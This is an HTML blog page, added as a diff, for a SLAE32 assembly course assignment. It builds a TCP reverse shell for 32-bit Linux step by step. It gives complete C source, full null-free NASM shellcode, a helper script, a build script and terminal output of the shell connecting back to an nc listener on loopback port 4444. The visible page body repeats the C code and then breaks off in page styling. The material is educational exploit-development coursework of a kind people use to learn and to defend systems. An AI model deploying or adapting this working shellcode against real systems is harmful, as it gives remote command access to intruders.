@@ -1,0 +1,506 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>SLAE32 - Assignment #2 - TCP Reverse Shell | geobour98</title>
+<meta name=keywords content="slae32,assembly,shellcode,exploit-development">
+<meta name=description content="Introduction This is the blog post for the 2nd Assignment of the SLAE32 course, which is offered by PentesterAcademy. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.
+The purpose of this assignment is to create a TCP Reverse Shell. A Reverse Shell has a listener running on the attacker and the target connects back to the attacker with a shell.">
+<meta name=author content="geobour98">
+<link rel=canonical href=https://geobour98.github.io/blog/slae32-2-reverse-shell/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.6a98292fb8fa8cf0f3ba4042d4b75515c04267550f3ad49ff6271b5af9562443.css integrity="sha256-apgpL7j6jPDzukBC1LdVFcBCZ1UPOtSf9icbWvlWJEM=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://geobour98.github.io/logo.png>
+<link rel=icon type=image/png sizes=16x16 href=https://geobour98.github.io/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://geobour98.github.io/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://geobour98.github.io/apple-touch-icon.png>
+<link rel=mask-icon href=https://geobour98.github.io/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2SY6CF9Q6K"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-2SY6CF9Q6K',{anonymize_ip:!1})}</script>
+<meta property="og:title" content="SLAE32 - Assignment #2 - TCP Reverse Shell">
+<meta property="og:description" content="Introduction This is the blog post for the 2nd Assignment of the SLAE32 course, which is offered by PentesterAcademy. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.
+The purpose of this assignment is to create a TCP Reverse Shell. A Reverse Shell has a listener running on the attacker and the target connects back to the attacker with a shell.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://geobour98.github.io/blog/slae32-2-reverse-shell/"><meta property="og:image" content="https://geobour98.github.io/47"><meta property="article:section" content="blog">
+<meta property="article:published_time" content="2023-03-23T00:00:00+00:00">
+<meta property="article:modified_time" content="2023-03-23T00:00:00+00:00"><meta property="og:site_name" content="geobour98">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://geobour98.github.io/47">
+<meta name=twitter:title content="SLAE32 - Assignment #2 - TCP Reverse Shell">
+<meta name=twitter:description content="Introduction This is the blog post for the 2nd Assignment of the SLAE32 course, which is offered by PentesterAcademy. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.
+The purpose of this assignment is to create a TCP Reverse Shell. A Reverse Shell has a listener running on the attacker and the target connects back to the attacker with a shell.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://geobour98.github.io/blog/"},{"@type":"ListItem","position":2,"name":"SLAE32 - Assignment #2 - TCP Reverse Shell","item":"https://geobour98.github.io/blog/slae32-2-reverse-shell/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SLAE32 - Assignment #2 - TCP Reverse Shell","name":"SLAE32 - Assignment #2 - TCP Reverse Shell","description":"Introduction This is the blog post for the 2nd Assignment of the SLAE32 course, which is offered by PentesterAcademy. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.\nThe purpose of this assignment is to create a TCP Reverse Shell. A Reverse Shell has a listener running on the attacker and the target connects back to the attacker with a shell.","keywords":["slae32","assembly","shellcode","exploit-development"],"articleBody":"Introduction This is the blog post for the 2nd Assignment of the SLAE32 course, which is offered by PentesterAcademy. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.\nThe purpose of this assignment is to create a TCP Reverse Shell. A Reverse Shell has a listener running on the attacker and the target connects back to the attacker with a shell. The communication happens over the TCP protocol.\nMy code can be found in my Github: geobour98’s Github.\nTCP Reverse Shell in C The easiest way, in my opinion, to create a TCP Reverse Shell in Assembly is to first create it in C and then “translate” it to ASM code.\nIn order create the TCP Reverse Shell, a few Linux system calls (syscalls) will be used. They can be found in the following table:\n   Syscall Usage     socket Creates an endpoint for communication   connect Initializes a connection on a socket   dup2 Duplicates a file descriptor   execve Executes a program    Create a socket:\nint sockfd = socket(AF_INET, SOCK_STREAM, 0); Initialize the connection on a socket, initializing the structure for the TCP/IP address first:\nstruct sockaddr_in address = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr = inet_addr(\"127.1.1.1\") }; connect(sockfd, (struct sockaddr*) \u0026address, sizeof(address)); Duplicate STDIN, STDOUT and STDERR file descriptors in order to redirect everything to the socket connected:\ndup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2); Execute the /bin/sh program:\nexecve(\"/bin/sh\", NULL, NULL); The whole C program is the following:\n// TCP Reverse Shell // Author: geobour98  #include #include #include #include  int main() { int sockfd = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in address = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr = inet_addr(\"127.1.1.1\") }; connect(sockfd, (struct sockaddr*) \u0026address, sizeof(address)); dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2); execve(\"/bin/sh\", NULL, NULL); return 0; } .notice{--root-color:#444;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#c33;--warning-content:#fee;--info-title:#fb7;--info-content:#fec;--note-title:#6be;--note-content:#e7f2fa;--tip-title:#5a5;--tip-content:#efe}@media (prefers-color-scheme:dark){.notice{--root-color:#ddd;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#800;--warning-content:#400;--info-title:#a50;--info-content:#420;--note-title:#069;--note-content:#023;--tip-title:#363;--tip-content:#121}}body.dark .notice{--root-color:#ddd;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#800;--warning-content:#400;--info-title:#a50;--info-content:#420;--note-title:#069;--note-content:#023;--tip-title:#363;--tip-content:#121}.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:var(--root-color);background:var(--root-background)}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:var(--title-color);background:var(--title-background)}.notice.warning .notice-title{background:var(--warning-title)}.notice.warning{background:var(--warning-content)}.notice.info .notice-title{background:var(--info-title)}.notice.info{background:var(--info-content)}.notice.note .notice-title{background:var(--note-title)}.notice.note{background:var(--note-content)}.notice.tip .notice-title{background:var(--tip-title)}.notice.tip{background:var(--tip-content)}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:.125em;position:relative} Info\nSyscall Arguments The arguments and their values for the syscalls will be explained later in the creation of the TCP Reverse Shell in Assembly. In order to prove that the Reverse Shell is working we have to compile the C program using the GNU Compiler (gcc):\ngeobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ gcc reverse-c.c -o reverse-c First, create a listener with nc on port 4444 and wait for connections:\ngeobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ nc -lvnp 4444 Then, in another terminal execute reverse-c.\ngeobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse-c In the first terminal verify the incoming connection and run the commands id and ls.\nListening on [0.0.0.0] (family 0, port 4444) Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 35304) id uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) ls compile.sh reverse reverse-c reverse-c.c reverse.nasm reverse.o reverse.py exit geobour98@slae32-dev:~$ TCP Reverse Shell in Assembly In order to implement the syscalls in Assembly, we have to find their defined numbers. These are located at the header file: /usr/include/i386-linux-gnu/asm/unistd_32.h.\nThe syscalls and their definitions can be found in the following table:\n   Syscall Definition     socket #define __NR_socket 359   connect #define __NR_connect 362   dup2 #define __NR_dup2 63   execve #define __NR_execve 11    Now we have to find the arguments and their values in order to be used in the syscalls.\n Syscall socket:  int socket(int domain, int type, int protocol); The domain argument specifies a communication domain. Since we operate through IPv4 protocol, we will use the AF_INET address family, which according to the socket header file: /usr/include/i386-linux-gnu/bits/socket.h belongs to the PF_INET protocol family. This protocol family is represented by the number 2.\nThe type argument specifies the communication semantics. We will use SOCK_STREAM, since it provides sequenced, reliable, two-way, connection-based byte streams. According to the socket_type header file: /usr/include/i386-linux-gnu/bits/socket_type.h, SOCK_STREAM is represented by the number 1.\nThe protocol argument specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.\nThe return value from socket is a file descriptor for the new socket, if socket was executed successfully.\n Syscall connect:  int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); The sockfd argument is the file descriptor returned from socket execution. It is an integer value.\nThe *addr argument is the address structure that will be assigned to the socket. The structure consists of 3 values. The first value is the AF_INET, which from before is the number 2. The second value is the port that the target will be connected to, which in our case is 4444. The third value is the interface that the socket will connect to. We provide the value 127.1.1.1 in order to connect to the loopback interface (127.0.0.0/8). Note that we avoid addresses like 127.0.0.1 (that contain 0), so we don’t have nullbytes in the shellcode.\nThe addrlen argument is the size, in bytes, of the address structure pointed to by addr. According to the header file: /usr/include/linux/in.h the size is 16 bytes.\n Syscall dup2:  int dup2(int oldfd, int newfd); The argument oldfd is the integer returned from socket.\nIf the descriptor newfd was previously open, it is silently closed before being reused. If oldfd is a valid file descriptor, and newfd has the same value as oldfd, then dup2 does nothing, and returns newfd. We execute dup2 3 times in order to pass the values: 0 for STDIN, 1 for STDOUT and 2 for STDERR.\nOn success dup2 returns the new descriptor.\n Syscall execve:  int execve(const char *filename, char *const argv[], char *const envp[]); The *filename argument must be either a binary executable or a script, so we pass to it the executable “bin/sh”.\nThe argv argument is an array of argument strings passed to the new program. The envp argument is an array of strings, conventionally of the form “key=value”, which are passed as environment to the new program. Since we don’t need any of these we pass the value NULL.\nAssembly in Detail Now we will examine the Assembly instructions in detail.\n Syscall socket  We first clear the register EAX and then pass the hexadecimal value 0x167, which in decimal is 359. That value is passed to the AX part of the EAX register, which contains the 16 less significant bits. The decimal 359 needs 9 bits in order to be represented in binary and since we must use registers with integer size multiple to 8, we need 16 bits. If we reserved the whole EAX register, then nullbytes (0x00) would be put in the 16 more significant bits that would break our shellcode.\nxor eax, eax mov ax, 0x167\t; 167 is the hex value of the decimal 359 for socket Then we clear the EBX register and pass to BL the value 2, since there is the PF_INET protocol family.\nxor ebx, ebx mov bl, 0x2\t; AF_INET numeric value from PF_INET protocol family After that, we clear the ECX register and pass to CL the value 1, since this is the value of SOCK_STREAM constant.\nxor ecx, ecx mov cl, 0x1\t; SOCK_STREAM constant from socket_type.h We clear the EDX register and the value 0, because of the single protocol, is passed as the third argument to socket syscall.\nxor edx, edx\t; 0 value because of single protocol Then, in order to actually execute the syscall, we run the following instruction:\nint 0x80\t; exec socket syscall That instruction will be invoked after declaring the arguments of each syscall in order to be executed.\nThe socket syscall returns a file descriptor (sockfd), so we copy it to the EBX register, since the result of the syscall is saved in the EAX register by default.\nmov ebx, eax\t; move sockfd (file descriptor) value into ebx  Syscall connect  We clear the EAX register and then pass the hexadecimal value 0x16a, which in decimal is 362. Note that these values come from the table with the syscalls and their definitions from above.\nxor eax, eax mov ax, 0x16a\t; 16a is the hex value of the decimal 362 for connect Info\nStack vs Registers When we use the stack, as we will for the following arguments, we push the arguments from last to first, since it is Last In First Out data structure. That’s not the case with registers, since each argument needs to be stored in a specific register. We start with the values for the address structure.\nWe push the hexadecimal value 0x0101017f to the stack, which is the address 127.1.1.1 in little endian representation, so the socket connects to the loopback interface (127.0.0.0/8).\npush 0x0101017f\t; connect to localhost (127.1.1.1) (little endian) Then, since we are dealing with little endianness the port with decimal value 4444 and hexadecimal 115c, becomes 5c11.\npush word 0x5c11\t; listen on port 4444 (little endian) After that, we push the value 2 for the AF_INET constant.\npush word 0x2\t; AF_INET constant We clear the ECX register, and save the value of the Stack Pointer (ESP register) there. So now ECX points at the top of the stack.\nxor ecx, ecx mov ecx, esp\t; ecx now points at address struct at the top of the stack Now the values for the struct are defined.\nThe EBX register already contains the value of sockfd from socket.\nThe ECX register already points at the beginning of the struct in the stack.\nWe clear the EDX register, and pass the hexadecimal value 0x10 (16 in decimal), since that is the size of the address struct.\nxor edx, edx mov dl, 0x10\t; 10 is the decimal 16 that is the size of the address struct The final step for the connect syscall is to invoke a syscall interrupt by the next instruction:\nint 0x80\t; exec connect syscall  Syscall dup2  We create a loop that will execute dup2 3 times for STDERR, STDOUT and STDIN respectively. So, we clear the ECX register and pass the value 0x3 to CL, which is the counter for the loop.\nxor ecx, ecx mov cl, 0x3\t; set counter to 3 We first declare the procedure dup2loop, which acts like a function, where we clear the EAX register and pass to AL the hexadecimal value 0x3f (63 in decimal) as the dup2 syscall number. Then, we decrement the counter (CL) by 1, so in the first iteration the value inside CL will be 2, representing the STDERR. 2 more iterations will happen with value 1 and 0 for STDOUT and STDIN respectively. Each iteration is finished by executing the dup2 syscall and by creating a conditional instruction. That instruction checks if the Zero Flag (ZF) is set, meaning it has value 0, and if it is the loop is stopped and the execution is continued. If it is not 0 a jump happens back to dup2loop. In the third iteration, CL is decremented to 0, so the ZF is set, and the execution will continue to the next instructions and there will not be a jump back to dup2loop.\ndup2loop: xor eax, eax mov al, 0x3f\t; 3f is the hex value of the decimal 63 for dup2 dec cl\t; decrement counter by 1 int 0x80\t; exec dup2 syscall jnz dup2loop\t; jump to loop if ZF is not zero, else continue  Syscall execve  We clear the EAX register and pass the hexadecimal value 0xb (11 in decimal) to AL as the execve syscall number.\nxor eax, eax mov al, 0xb\t; b is the hex value of the decimal 11 for execve Then we clear the EDX register. The last 2 arguments of execve have NULL values, so we push the EDX value to the stack twice. Also, the executable “/bin/sh” must be null terminated, so we push one more time the EDX value to the stack.\nxor edx, edx push edx\t; NULL argument push edx\t; NULL argument push edx\t; null terminator Since “/bin/sh” is only 7 bytes, we need to make it 8 bytes. That is because when a string is pushed to the stack it must be multiplied by 4. The safest way to do that, without breaking any functionality, is to add a /. So the string /bin/sh becomes /bin//sh. The following string would be valid too //bin/sh. Since we are dealing with the stack again, the string must be reversed first. The next python script will help achieve that.\n#!/usr/bin/python import sys input = sys.argv[1] print 'String length: ' + str(len(input)) stringList = [input[i:i+4] for i in range(0, len(input), 4)] for item in stringList[::-1]: print item[::-1] + ' : ' + str(item[::-1].encode('hex')) We run the above script by providing the string we want to be reversed.\ngeobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse.py \"/bin//sh\" String length: 8 hs// : 68732f2f nib/ : 6e69622f Now the string is represented as hex and we can push it to the stack. So we push first the string “hs//” and then the string “nib/”.\n; PUSH /bin//sh push 0x68732f2f\t; \"hs//\" push 0x6e69622f\t; \"nib/\" Finally, we save ESP value to the EBX register in order to point at the top of the stack and execute the execve syscall.\nmov ebx, esp\t; ebx points at \"/bin//sh\" at the top of the stack int 0x80\t; exec execve syscall The whole Assembly program is the following:\n; TCP Reverse Shell ; Author: geobour98  global _start section .text _start: ; socket  xor eax, eax mov ax, 0x167\t; 167 is the hex value of the decimal 359 for socket xor ebx, ebx mov bl, 0x2\t; AF_INET numeric value from PF_INET protocol family xor ecx, ecx mov cl, 0x1\t; SOCK_STREAM constant from socket_type.h xor edx, edx\t; 0 value because of single protocol\t int 0x80\t; exec socket syscall  mov ebx, eax\t; move sockfd (file descriptor) value into ebx ; connect xor eax, eax mov ax, 0x16a\t; 16a is the hex value of the decimal 362 for connect push 0x0101017f\t; connect to localhost (127.1.1.1) (little endian) push word 0x5c11\t; connect to port 4444 (little endian) push word 0x2\t; AF_INET constant xor ecx, ecx mov ecx, esp\t; ecx now points at address struct at the top of the stack xor edx, edx mov dl, 0x10\t; 10 is the decimal 16 that is the size of the address struct int 0x80\t; execute connect syscall ; dup2 loop xor ecx, ecx\t; clear ecx mov cl, 0x3\t; set counter to 3 dup2loop: xor eax, eax mov al, 0x3f\t; 3f is the hex value of the decimal 63 for dup2 dec cl\t; decrement counter by 1 int 0x80\t; exec dup2 syscall jnz dup2loop\t; jump to loop if ZF is not zero, else continue ; execve xor eax, eax mov al, 0xb\t; b is the hex value of the decimal 11 for execve  xor edx, edx push edx\t; NULL argument push edx\t; NULL argument push edx\t; null terminator ; PUSH /bin//sh push 0x68732f2f\t; \"hs//\" push 0x6e69622f\t; \"nib/\" mov ebx, esp\t; ebx points at \"/bin//sh\" at the top of the stack int 0x80\t; exec execve syscall Testing the Reverse Shell In order to test Reverse Shell, we need to compile it. Compilation process consists of 2 separate processes:\n Assembling: can happen with the nasm assembler, which assembles the input file (.nasm) and directs output to the output file (.o) if specified. It basically “translates” the Assembly code. Linking: can happen with the GNU linker ld, which combines a number of object and archive files, relocates their data and ties up symbol references. It basically provides information such as where the entry point of a program is. By default the entry point is _start but this can be changed.  The following bash script automates that process:\n#!/bin/bash  echo '[+] Assembling with Nasm ... ' nasm -felf32 -o $1.o $1.nasm echo '[+] Linking ...' ld -o $1 $1.o echo '[+] Done!' The following command does the compilation and creates the executable reverse:\ngeobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./compile.sh reverse [+] Assembling with Nasm ... [+] Linking ... [+] Done! We test the Reverse Shell by creating a listener on port 4444 with nc in one terminal window and in another we execute the executable reverse. Then, back to the first we verify the incoming connection and run the commands id and ls.\n1st window:\ngeobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ nc -lvnp 4444 2nd window:\ngeobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse 1st window again:\nListening on [0.0.0.0] (family 0, port 4444) Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 35306) id uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) ls compile.sh reverse reverse-c reverse-c.c reverse.nasm reverse.o reverse.py exit geobour98@slae32-dev:~$ Summary We have a working TCP Reverse Shell that connects to loopback interface on port 4444 on our machine and we can execute commands after connecting.\nNext will be the Egg Hunter shellcode!\nNote\nSLAE32 Blog Post This blog post has been created for completing the requirements of the SecurityTube Linux Aseembly Expert certification:\nhttps://www.pentesteracademy.com/course?id=3\nhttp://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-36167\n ","wordCount":"2807","inLanguage":"en","datePublished":"2023-03-23T00:00:00Z","dateModified":"2023-03-23T00:00:00Z","author":{"@type":"Person","name":"geobour98"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.github.io/blog/slae32-2-reverse-shell/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.github.io/logo.png"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://geobour98.github.io/ accesskey=h title="geobour98 (Alt + H)">
+<img src=https://geobour98.github.io/logo.png alt aria-label=logo height=35>geobour98</a>
+<div class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</div>
+</div>
+<ul id=menu>
+<li>
+<a href=https://geobour98.github.io/about/ title=About>
+<span>About</span>
+</a>
+</li>
+<li>
+<a href=https://geobour98.github.io/blog/ title=Blog>
+<span>Blog</span>
+</a>
+</li>
+<li>
+<a href=https://geobour98.github.io/write-ups/ title=Write-ups>
+<span>Write-ups</span>
+</a>
+</li>
+<li>
+<a href=https://geobour98.github.io/tags/ title=Tags>
+<span>Tags</span>
+</a>
+</li>
+<li>
+<a href=https://geobour98.github.io/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<h1 class=post-title>
+SLAE32 - Assignment #2 - TCP Reverse Shell
+</h1>
+<div class=post-meta><span title="2023-03-23 00:00:00 +0000 UTC">March 23, 2023</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;geobour98
+</div>
+</header>
+<div class=post-content><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2>
+<p>This is the blog post for the 2<sup>nd</sup> Assignment of the SLAE32 course, which is offered by <a href="https://www.pentesteracademy.com/course?id=3">PentesterAcademy</a>. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.</p>
+<p>The purpose of this assignment is to create a TCP Reverse Shell. A Reverse Shell has a listener running on the attacker and the target connects back to the attacker with a shell. The communication happens over the TCP protocol.</p>
+<p>My code can be found in my Github: <a href=https://github.com/geobour98/slae32>geobour98&rsquo;s Github</a>.</p>
+<h2 id=tcp-reverse-shell-in-c>TCP Reverse Shell in C<a hidden class=anchor aria-hidden=true href=#tcp-reverse-shell-in-c>#</a></h2>
+<p>The easiest way, in my opinion, to create a TCP Reverse Shell in <code>Assembly</code> is to first create it in <code>C</code> and then &ldquo;translate&rdquo; it to ASM code.</p>
+<p>In order create the TCP Reverse Shell, a few Linux system calls (<code>syscalls</code>) will be used. They can be found in the following table:</p>
+<table>
+<thead>
+<tr>
+<th>Syscall</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>socket</code></td>
+<td>Creates an endpoint for communication</td>
+</tr>
+<tr>
+<td><code>connect</code></td>
+<td>Initializes a connection on a socket</td>
+</tr>
+<tr>
+<td><code>dup2</code></td>
+<td>Duplicates a file descriptor</td>
+</tr>
+<tr>
+<td><code>execve</code></td>
+<td>Executes a program</td>
+</tr>
+</tbody>
+</table>
+<p>Create a socket:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> sockfd <span style=color:#f92672>=</span> socket(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);
+</code></pre></div><p>Initialize the connection on a socket, initializing the structure for the TCP/IP address first:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>struct</span> sockaddr_in address <span style=color:#f92672>=</span> {
+	.sin_family <span style=color:#f92672>=</span> AF_INET,
+	.sin_port <span style=color:#f92672>=</span> htons(<span style=color:#ae81ff>4444</span>),
+	.sin_addr <span style=color:#f92672>=</span> inet_addr(<span style=color:#e6db74>&#34;127.1.1.1&#34;</span>)
+};
+
+connect(sockfd, (<span style=color:#66d9ef>struct</span> sockaddr<span style=color:#f92672>*</span>) <span style=color:#f92672>&amp;</span>address, <span style=color:#66d9ef>sizeof</span>(address));
+</code></pre></div><p>Duplicate STDIN, STDOUT and STDERR file descriptors in order to redirect everything to the socket connected:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>dup2(sockfd, <span style=color:#ae81ff>0</span>);
+dup2(sockfd, <span style=color:#ae81ff>1</span>);
+dup2(sockfd, <span style=color:#ae81ff>2</span>);
+</code></pre></div><p>Execute the <code>/bin/sh</code> program:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>execve(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, NULL, NULL);
+</code></pre></div><p>The whole <code>C</code> program is the following:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>// TCP Reverse Shell
+</span><span style=color:#75715e>// Author: geobour98
+</span><span style=color:#75715e></span>
+<span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/socket.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;netinet/in.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+{
+	
+	<span style=color:#66d9ef>int</span> sockfd <span style=color:#f92672>=</span> socket(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);
+
+	<span style=color:#66d9ef>struct</span> sockaddr_in address <span style=color:#f92672>=</span> {
+		.sin_family <span style=color:#f92672>=</span> AF_INET,
+		.sin_port <span style=color:#f92672>=</span> htons(<span style=color:#ae81ff>4444</span>),
+		.sin_addr <span style=color:#f92672>=</span> inet_addr(<span style=color:#e6db74>&#34;127.1.1.1&#34;</span>)
+	};
+
+	connect(sockfd, (<span style=color:#66d9ef>struct</span> sockaddr<span style=color:#f92672>*</span>) <span style=color:#f92672>&amp;</span>address, <span style=color:#66d9ef>sizeof</span>(address));
+
+	dup2(sockfd, <span style=color:#ae81ff>0</span>);
+	dup2(sockfd, <span style=color:#ae81ff>1</span>);
+	dup2(sockfd, <span style=color:#ae81ff>2</span>);
+
+	execve(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, NULL, NULL);
+	
+	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+}
+</code></pre></div><style type=text/css>.notice{--root-color:#444;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#c33;--warning-content:#fee;--info-title:#fb7;--info-content:#fec;--note-title:#6be;--note-content:#e7f2fa;--tip-title:#5a5;--tip-content:#efe}@media(prefers-color-scheme:dark){.notice{--root-color:#ddd;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#800;--warning-content:#400;--info-title:#a50;--info-content:#420;--note-title:#069;--note-content:#023;--tip-title:#363;--tip-content:#121}}body.dark .notice{--root-color:#ddd;--root-background:#eff;--title-color:#fff;--title-background:#7bd;--warning-title:#800;--warning-content:#400;--info-title:#a50;--info-content:#420;--note-title:#069;--note-content:#023;--tip-title:#363;--tip-content:#121}.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:var(--root-color);background:var(--root-background)}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:var(--title-color);background:var(--title-background)}.notice.warning .notice-title{background:var(--warning-title)}.notice.warning{background:var(--warning-content)}.notice.info .notice-title{background:var(--info-title)}.notice.info{background:var(--info-content)}.notice.note .notice-title{background:var(--note-title)}.notice.note{background:var(--note-content)}.notice.tip .notice-title{background:var(--tip-title)}.notice.tip{background:var(--tip-content)}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline 